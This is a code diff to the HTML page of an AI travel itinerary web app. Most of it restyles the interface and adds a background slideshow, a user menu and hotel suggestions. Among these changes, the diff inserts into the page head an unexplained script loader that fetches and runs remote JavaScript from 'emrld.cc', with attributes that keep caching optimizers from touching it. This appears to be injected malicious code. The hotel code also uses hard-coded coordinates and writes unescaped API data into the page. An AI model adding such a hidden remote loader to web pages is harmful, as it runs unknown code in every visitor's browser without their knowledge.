@@ -9,7 +9,7 @@
     <title id="Main-title" >AI Travel Itinerary Generator</title>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
- 
+    
 
 @font-face {
   font-family: 'Montserrat Normal';
@@ -155,13 +155,16 @@ body {
         }
 
         body {
-           
-            background: #ffffff;
-            color: #ffffff;
-            min-height: 100vh;
-            padding: 20px;
-            line-height: 1.6;
-        }
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  flex-direction: column;
+  padding: 20px;
+  background-color: #fff;
+  position: relative;
+}
+
 
         .container {
             max-width: 1200px;
@@ -200,26 +203,22 @@ body {
     100% { background-position: 0% center; }
 }
         .header p {
-            color: #8d8787;
+            color: #ffffff;
             font-size: 1.1rem;
             font-weight: 400;
         }
 
-        .form-container {
-            /* linear-gradient(147deg, #e3e0e0, #ffffff); */
-            background:  linear-gradient(147deg, #e3e0e0, #ffffff);
-            border: 1px solid #f3ecec;
-            border-radius: 20px;
-            padding: 40px;
-            margin-bottom: 40px;
-            box-shadow: 
-                0 20px 40px rgb(104 104 104 / 40%),
-                inset 0 1px 0 rgba(255, 255, 255, 0.1);
-            position: relative;
-            overflow: hidden;
-             backdrop-filter: blur(10px);
-            background-color: rgb(255 255 255 / 65%); /* translucent */
-        }
+     .form-container {
+  background: rgba(255, 255, 255, 0);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255, 255, 255, 0.13);
+  box-shadow: 0 8px 32px rgba(31, 38, 135, 0.2);
+  border-radius: 20px;
+  padding: 40px;
+  position: relative;
+  z-index: 2;
+}
+
 
         .form-container::before {
             content: '';
@@ -333,7 +332,7 @@ body {
             display: block;
             margin-bottom: 8px;
             font-weight: 600;
-            color: #4c4c4c;
+            color: #ffffff;
             font-size: 0.95rem;
             text-transform: uppercase;
             letter-spacing: 0.5px;
@@ -342,7 +341,7 @@ body {
         .form-group input, .form-group select {
             width: 100%;
             padding: 16px 20px;
-            background: #ffffff;
+            background: #ffffff00;
             border: 1px solid #afadad;
             border-radius: 12px;
             font-size: 16px;
@@ -964,7 +963,11 @@ font-family: 'Montserrat Normal', sans-serif;
 .container {
     position: relative;
     z-index: 2;
+    min-height: 100vh;
+  padding-bottom: 80px;
+
 }
+
 /* Grid Background */
 .grid-overlay {
     position: fixed;
@@ -1171,22 +1174,205 @@ text-align: left;
 #auth-section button:hover {
   opacity: 0.9;
 }
+.background-slideshow {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  z-index: -1;
+}
 
+.background-slideshow .slide {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  opacity: 0;
+  transition: opacity 1.5s ease-in-out;
+}
+
+.background-slideshow .slide.active {
+  opacity: 1;
+}
+.background-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.63); /* soft bluish-dark overlay */
+  z-index: 1;
+}
+.background-slideshow.hide,
+.background-overlay.hide {
+  display: none !important;
+}
+#results {
+  margin-top: 80px;
+  z-index: 2;
+}
+
+.modal-content {
+  background: linear-gradient(145deg, #ebebeb, #ffffff);
+  border: 1px solid #dcdcdc;
+  border-radius: 16px;
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+  width: 100%;
+  max-width: 400px;
+}
+
+.modern-btn {
+  padding: 10px 18px;
+  border-radius: 10px;
+  font-weight: 600;
+  font-family: 'Montserrat Normal', sans-serif;
+  font-size: 14px;
+  cursor: pointer;
+  border: none;
+  transition: all 0.3s ease;
+}
+
+.modern-btn.primary {
+  background: linear-gradient(135deg, #00d4ff, #7c3aed);
+  color: white;
+  box-shadow: 0 4px 14px rgba(0, 212, 255, 0.3);
+}
+
+.modern-btn.primary:hover {
+  background: linear-gradient(135deg, #009bdc, #5e2ce2);
+  transform: translateY(-1px);
+}
+
+.modern-btn.secondary {
+  background: #e0e0e0;
+  color: #333;
+  border: 1px solid #ccc;
+}
+
+.modern-btn.secondary:hover {
+  background: #d5d5d5;
+  transform: translateY(-1px);
+}
+
+.location-actions {
+  display: flex;
+  gap: 12px;
+  margin-top: 16px;
+  margin-bottom: 12px;
+  justify-content: flex-end;
+}
+
+.modern-icon-btn {
+  background: #f9f9f9;
+  border: 1px solid #d0d0d0;
+  color: #333;
+  padding: 8px 14px;
+  font-size: 14px;
+  font-weight: 500;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 14px rgba(0, 0, 0, 0.05);
+}
+
+.modern-icon-btn:hover {
+  background: #ffffff;
+  border-color: #a0a0a0;
+  transform: translateY(-1px);
+}
+
+.modern-icon-btn.danger {
+  background: #fff5f5;
+  color: #d9002c;
+  border: 1px solid #f3c0c0;
+}
+
+.modern-icon-btn.danger:hover {
+  background: #ffe0e0;
+  border-color: #d9002c;
+}
+.user-email-display {
+  padding: 14px 16px;
+  font-weight: 600;
+  color: #2d2d2d;
+  font-size: 14px;
+  background: linear-gradient(to right, #f9f9f9, #ffffff);
+  border-bottom: 1px solid #e2e2e2;
+}
+
+.menu-dropdown {
+  position: absolute;
+  top: 50px;
+  right: 0;
+  background: white;
+  border: 1px solid #ddd;
+  border-radius: 10px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12);
+  display: flex;
+  flex-direction: column;
+  width: 220px;
+  overflow: hidden;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+.dropdown-link {
+  padding: 12px 18px;
+  text-align: left;
+  background: white;
+  color: #333;
+  border: none;
+  font-size: 14px;
+  text-decoration: none;
+  transition: all 0.2s ease;
+}
+
+.dropdown-link:hover {
+  background: #f0f4ff;
+  color: #1a4de0;
+}
+
+.dropdown-divider {
+  border: none;
+  height: 1px;
+  background: #eee;
+  margin: 0;
+}
 
     </style>
+    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.cc/NDM3ODk3.js?t=437897';
+      document.head.appendChild(script);
+  })();
+</script>
 </head>
 <body>
+<div class="background-slideshow">
+  <div class="background-overlay"></div>
+  <img src="./img/img6.jpg" class="slide active" />
+  <img src="./img/img2.jpg" class="slide" />
+  <img src="./img/img3.jpg" class="slide" />
+  <img src="./img/img4.jpg" class="slide" />
 
+  <img src="./img/img5.jpg" class="slide" />
+ 
+
+
+</div>
 <div class="floating-user-menu">
   <button id="userMenuToggle" title="Menu">☰</button>
   <div id="userMenuDropdown" class="menu-dropdown hidden">
-    <div id="userEmail" style="padding: 10px 16px; font-weight: bold; color: #565656;">👤 Checking...</div>
+  <div id="userEmail" class="user-email-display">Loading...</div>
+  <hr class="dropdown-divider" />
+  <a href="dashboard.html" id="dashboardLink" class="dropdown-link">Dashboard</a>
+  <a href="#" id="logoutLink" onclick="logout()" class="dropdown-link">Logout</a>
+  <a href="#" id="loginLink" class="dropdown-link" style="display: none;">Login</a>
+</div>
 
-    <!-- Auth-based options -->
-    <a href="dashboard.html" id="dashboardLink">Dashboard</a>
-    <a href="#" id="logoutLink" onclick="logout()">Logout</a>
-    <a href="#" id="loginLink" style="display: none;">Login</a>
-  </div>
 </div>
 
 
@@ -1255,16 +1441,19 @@ text-align: left;
   <img id="lightbox-img" src="" alt="Zoomed" style="max-width:90%; max-height:90%; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.4);">
 </div>
 <div id="editLocationModal" class="modal hidden">
-  <div class="modal-content">
-    <h3>Edit Location</h3>
-    <p id="editLocationCurrentLoc">Current location: <span></span></p>
-    <input type="text" id="editLocationPreference" placeholder="e.g. museum, beach, park" />
-    <div class="modal-actions">
-      <button id="editLocationSubmitBtn">Replace</button>
-      <button id="editLocationCancelBtn">Cancel</button>
+  <div class="modal-content" style="padding: 24px;">
+    <h3 style="font-size: 20px; font-weight: 600; margin-bottom: 16px; color: #333;">Edit Location</h3>
+    <p id="editLocationCurrentLoc" style="margin-bottom: 12px; color: #555;">
+      Current location: <strong><span></span></strong>
+    </p>
+    <input type="text" id="editLocationPreference" placeholder="e.g. museum, beach, park" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ccc; margin-bottom: 20px; font-size: 14px;" />
+    <div class="modal-actions" style="display: flex; justify-content: flex-end; gap: 10px;">
+      <button id="editLocationSubmitBtn" class="modern-btn primary">Replace</button>
+      <button id="editLocationCancelBtn" class="modern-btn secondary">Cancel</button>
     </div>
   </div>
 </div>
+
 
 <!-- 🔐 Firebase Auth Login/Signup -->
 <div id="auth-section" style="
@@ -1362,7 +1551,16 @@ text-align: left;
 <script>
   let itinerarySaved = false;
 </script>
-    
+<script>
+  const slides = document.querySelectorAll('.background-slideshow .slide');
+  let index = 0;
+  setInterval(() => {
+    slides[index].classList.remove('active');
+    index = (index + 1) % slides.length;
+    slides[index].classList.add('active');
+  }, 7000); // change every 7 seconds
+</script>
+
     <script>
   function sanitizeItinerary(itineraryArray) {
   return itineraryArray.map((item) => {
@@ -1400,8 +1598,8 @@ text-align: left;
 
     </script>
     <script>
-        // const API_BASE_URL = 'http://localhost:5000'; // Your backend URL
-        const API_BASE_URL = window.location.origin;
+        const API_BASE_URL = 'http://localhost:5000'; // Your backend URL
+        // const API_BASE_URL = window.location.origin;
         let googleMapsLoaded = false;
         let mapsToInitialize = [];
         let allLocationsData = [];
@@ -1662,16 +1860,29 @@ async function displayResults(data) {
             ${location.images?.map(img => `<img src="/api/photo?ref=${img.split('photoreference=')[1]}" class="location-image" />`).join('') || '<div class="no-images">No images available</div>'}
              </div>
           </div>
-           <button class="edit-btn" data-day="${location.day}" data-location="${location.location}">✏️</button>
-          <button class="delete-btn text-red-500 hover:text-red-700" data-day="${day}" data-location="${location.location}">
-  ❌
-</button>
+           <div class="location-actions">
+  <button class="edit-btn modern-icon-btn" title="Edit" data-day="${location.day}" data-location="${location.location}">
+    ✎ Edit
+  </button>
+  <button class="delete-btn modern-icon-btn danger" title="Delete" data-day="${day}" data-location="${location.location}">
+    ✕ Delete
+  </button>
+</div>
+
 
 
           <div id="map-${dayIndex}-${locIndex}"  class="location-map"></div>
         </div>
       `;
+     
+
     }
+     html += `
+  <div class="day-hotel-section" data-day="${dayIndex}" data-fetched="false">
+    <div class="day-dropdown" style="color: black;">▼ Want hotels for ${day}?</div>
+    <div class="hotel-list" style="display: none; color: black; "></div>
+  </div>
+`;
     html += `<div id="distance-summary-${dayIndex}" class="summary-section"></div></div>`;
   }
 // <button class="add-location-btn text-green-600 hover:text-green-800" data-day="${day}">
@@ -1698,8 +1909,11 @@ async function displayResults(data) {
   // Set content and show it
   resultsDiv.innerHTML = html;
   resultsDiv.style.display = 'block';
+  document.querySelector('.background-slideshow')?.classList.add('hide');
+  document.querySelector('.background-overlay')?.classList.add('hide');
 
-  // ✅ Hide loader now — initial content is ready
+attachHotelDropdownListeners();
+  //  Hide loader now — initial content is ready
   showLoading(false);
 
   // Smooth scroll
@@ -2286,18 +2500,30 @@ async function getDistancesBetweenLocations(dayLocations) {
 
   return Promise.all(distancePromises);
 }
-async function refreshDistancesAfterEdit() {
-  const daySections = document.querySelectorAll(".day-section");
+function refreshDistancesAfterEdit(day) {
+  const cards = document.querySelectorAll(`.location-card`);
+  const updatedLocations = [];
 
-  for (let section of daySections) {
-    const travelBox = section.querySelector(".travel-box");
-    const locationNames = Array.from(section.querySelectorAll(".location-name")).map(el =>
-      el.textContent.replace("📍", "").trim()
-    );
+  cards.forEach((card) => {
+    const btn = card.querySelector(".edit-btn");
+    if (btn && btn.dataset.day === day) {
+      const location = card.querySelector(".location-name")?.textContent?.replace("📍", "").trim();
+      if (location) {
+        updatedLocations.push({ location });
+      }
+    }
+  });
 
-    if (travelBox && locationNames.length > 1) {
-      const distances = await getDistancesBetweenLocations(locationNames);
-      let summary = `<div class="travel-box-content">`;
+  if (updatedLocations.length > 1) {
+    getDistancesBetweenLocations(updatedLocations).then(distances => {
+      const dayIndex = parseInt(day.replace("Day", "")) - 1;
+      const el = document.getElementById(`distance-summary-${dayIndex}`);
+      if (!el) return;
+
+      let summary = `
+        <h4>Travel Summary for ${day}</h4>
+        <div class="travel-summary">
+      `;
 
       distances.forEach((d, index) => {
         summary += `
@@ -2317,11 +2543,10 @@ async function refreshDistancesAfterEdit() {
       });
 
       summary += `</div>`;
-      travelBox.innerHTML = summary;
-    }
+      el.innerHTML = summary;
+    });
   }
 }
-
 
         // Test backend connection on page load
         window.addEventListener('load', async function() {
@@ -2784,7 +3009,7 @@ submitBtn.addEventListener("click", async () => {
   data.images
 );
 refreshOverviewMapFromDOM();
-refreshDistancesAfterEdit();
+refreshDistancesAfterEdit(currentEditDay);
     // ✅ Reset modal state
     editModal.classList.add("hidden");
     preferenceInput.value = "";
@@ -2869,9 +3094,10 @@ function updateItineraryLocation(day, oldLocation, newLocation, newDescription, 
           restaurantContainerId
         );
       }
+       refreshDistancesAfterEdit(locDay);
     }
   });
-  refreshDistancesAfterEdit();
+ 
 }
 })
 function refreshOverviewMapFromDOM() {
@@ -2943,6 +3169,71 @@ function refreshOverviewMapFromDOM() {
 }
 
 </script>
+
+<!-- hotel reccomendations  -->
+<script>
+  function attachHotelDropdownListeners() {
+  document.querySelectorAll('.day-dropdown').forEach(dropdown => {
+    dropdown.addEventListener('click', async () => {
+      const section = dropdown.closest('.day-hotel-section');
+      const hotelList = section.querySelector('.hotel-list');
+
+      const alreadyFetched = section.dataset.fetched === "true";
+      const dayIndex = section.dataset.day;
+
+      hotelList.style.display = hotelList.style.display === 'none' ? 'block' : 'none';
+
+      if (alreadyFetched) return;
+
+      const lat = 28.6139;
+      const lng = 77.2090;
+      const checkIn = "2025-07-20";
+      const checkOut = "2025-07-21";
+
+   const url = `http://localhost:5000/api/hotels?lat=28.6139&lng=77.2090&checkIn=2025-07-20&checkOut=2025-07-21`;
+
+
+
+
+      try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        const hotels = Array.isArray(data)
+          ? data
+          : Array.isArray(data.results)
+            ? data.results
+            : [];
+
+        if (!hotels.length) {
+          hotelList.innerHTML = `<p>No hotels found.</p>`;
+          return;
+        }
+
+        hotels.forEach(hotel => {
+          const card = document.createElement('div');
+          card.classList.add('hotel-card');
+          card.innerHTML = `
+            <h4>${hotel.hotelName}</h4>
+            <p>Price: ₹${Math.round(hotel.priceFrom)}</p>
+            <p>Rating: ${'⭐'.repeat(hotel.stars || 0)}</p>
+            <p>Location: ${hotel.location?.name || 'N/A'}, ${hotel.location?.country || ''}</p>
+          `;
+          hotelList.appendChild(card);
+        });
+
+        section.dataset.fetched = "true";
+
+      } catch (err) {
+        console.error("Fetch error:", err);
+        hotelList.innerHTML = `<p>Error fetching hotels: ${err.message}</p>`;
+      }
+    });
+  });
+}
+
+</script>
+
 
 <!-- backend start from here -->
 <!-- Firebase SDK -->
@@ -3045,15 +3336,15 @@ firebase.auth().onAuthStateChanged(user => {
     console.log("Authenticated:", user.email);
     localStorage.setItem("userUID", user.uid);
 
-    emailDisplay.textContent = `👤 ${user.email}`;
+    emailDisplay.textContent = `${user.email}`;
     dashboardLink.style.display = "block";
     logoutLink.style.display = "block";
     loginLink.style.display = "none";
   } else {
-    console.log("👤 Not logged in");
+    console.log("Not logged in");
     localStorage.removeItem("userUID");
 
-    emailDisplay.textContent = "👤 Not logged in";
+    emailDisplay.textContent = "Not logged in";
     dashboardLink.style.display = "none";
     logoutLink.style.display = "none";
     loginLink.style.display = "block";
@@ -3077,21 +3368,21 @@ const logoutBtn = document.getElementById("logoutBtn");
 
 firebase.auth().onAuthStateChanged(user => {
   if (user) {
-    console.log("🔐 Authenticated:", user.email);
+    console.log(" Authenticated:", user.email);
     localStorage.setItem("userUID", user.uid);
     document.getElementById("auth-section").style.display = "none";
 
-    // ✅ Update UI
+    // Update UI
     statusText.textContent = `Hello, ${user.email}`;
     logoutBtn.style.display = "inline-block";
 
     // Reset count
     localStorage.removeItem("itineraryCount");
   } else {
-    console.log("👤 Not logged in");
+    console.log("Not logged in");
     localStorage.removeItem("userUID");
 
-    // ✅ Update UI
+    // Update UI
     statusText.innerHTML = `<a href="#" onclick="showAuthForm()">Login / Sign Up</a>`;
     logoutBtn.style.display = "none";
   }
@@ -3125,7 +3416,7 @@ function logout() {
   // Show user email if logged in
   firebase.auth().onAuthStateChanged(user => {
     if (user) {
-      document.getElementById("userEmail").textContent = `👤 ${user.email}`;
+      document.getElementById("userEmail").textContent = `${user.email}`;
     } else {
       document.getElementById("userEmail").textContent = `Not logged in`;
     }
